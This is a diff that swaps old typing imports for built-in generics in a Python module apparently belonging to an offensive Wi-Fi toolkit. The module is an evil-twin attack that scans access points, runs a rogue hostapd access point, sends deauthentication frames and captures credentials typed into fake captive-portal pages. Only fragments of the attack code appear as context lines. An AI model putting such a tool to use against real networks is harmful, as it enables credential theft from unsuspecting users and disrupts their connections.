@@ -23,7 +23,6 @@ OS requirement: Linux only (hostapd, raw sockets, monitor mode).
 Version: 1.0.0
 """
 
-from __future__ import annotations
 
 import http.server
 import json
@@ -57,7 +56,7 @@ _TEMPLATE_DIR = os.path.normpath(
 # captive portal popup on Apple, Android, and Windows devices.
 # ---------------------------------------------------------------------------
 
-CONNECTIVITY_CHECKS: Dict[str, Tuple[int, str]] = {
+CONNECTIVITY_CHECKS: dict[str, tuple[int, str]] = {
     "/hotspot-detect.html": (
         200,
         "<HTML><HEAD><TITLE>Success</TITLE></HEAD><BODY>Success</BODY></HTML>",
@@ -94,10 +93,10 @@ class _CredentialStore:
         """
         self._output_file = output_file
         self._lock = threading.Lock()
-        self._entries: List[Dict[str, Any]] = []
+        self._entries: list[dict[str, Any]] = []
         os.makedirs(os.path.dirname(os.path.abspath(output_file)), exist_ok=True)
 
-    def add(self, data: Dict[str, Any]) -> None:
+    def add(self, data: dict[str, Any]) -> None:
         """Record a credential entry and persist it to disk.
 
         Args:
@@ -120,7 +119,7 @@ class _CredentialStore:
             return len(self._entries)
 
     @property
-    def all(self) -> List[Dict[str, Any]]:
+    def all(self) -> list[dict[str, Any]]:
         """Return a snapshot of all captured credential dicts."""
         with self._lock:
             return list(self._entries)
@@ -172,7 +171,7 @@ class Exploit(Exploit):
     # AP scanning
     # ------------------------------------------------------------------
 
-    def scan_aps(self, iface: str, duration: float = 15.0) -> List[Dict[str, Any]]:
+    def scan_aps(self, iface: str, duration: float = 15.0) -> list[dict[str, Any]]:
         """Sniff 802.11 Beacon and ProbeResponse frames to discover APs.
 
         Requires the interface to be in monitor mode and Scapy to be
@@ -202,7 +201,7 @@ class Exploit(Exploit):
                 "Scapy is required for AP scanning. Install: pip install scapy"
             ) from exc
 
-        seen: Dict[str, Dict[str, Any]] = {}
+        seen: dict[str, dict[str, Any]] = {}
 
         def _process(pkt: Any) -> None:
             has_beacon = pkt.haslayer(Dot11Beacon)
@@ -339,7 +338,7 @@ class Exploit(Exploit):
     # Template listing
     # ------------------------------------------------------------------
 
-    def list_templates(self) -> List[str]:
+    def list_templates(self) -> list[str]:
         """Return names of available captive portal templates.
 
         Scans resources/captive_templates/ for:
@@ -430,7 +429,7 @@ class Exploit(Exploit):
     # Portal HTTP server
     # ------------------------------------------------------------------
 
-    def capture_credentials(self, body: str) -> Dict[str, str]:
+    def capture_credentials(self, body: str) -> dict[str, str]:
         """Parse and sanitize POST body into a credential dict.
 
         Args:
@@ -441,7 +440,7 @@ class Exploit(Exploit):
             with null bytes removed.
         """
         raw = urllib.parse.parse_qs(body, keep_blank_values=False)
-        creds: Dict[str, str] = {}
+        creds: dict[str, str] = {}
         for key, values in raw.items():
             safe_key = str(key).replace("\x00", "")[:64]
             safe_val = str(values[0] if values else "").replace("\x00", "")[:512]
@@ -809,7 +808,7 @@ class Exploit(Exploit):
         time.sleep(0.5)
 
         # Start hostapd
-        hostapd_proc: Optional[subprocess.Popen] = None
+        hostapd_proc: subprocess.Popen | None = None
         try:
             hostapd_proc = self.start_hostapd(conf_path)
             time.sleep(2)
@@ -822,7 +821,7 @@ class Exploit(Exploit):
 
         # Deauth thread
         stop_deauth = threading.Event()
-        deauth_thread: Optional[threading.Thread] = None
+        deauth_thread: threading.Thread | None = None
         if bool(self.deauth_continuous) and iface_mon:
             deauth_thread = threading.Thread(
                 target=self._deauth_loop,
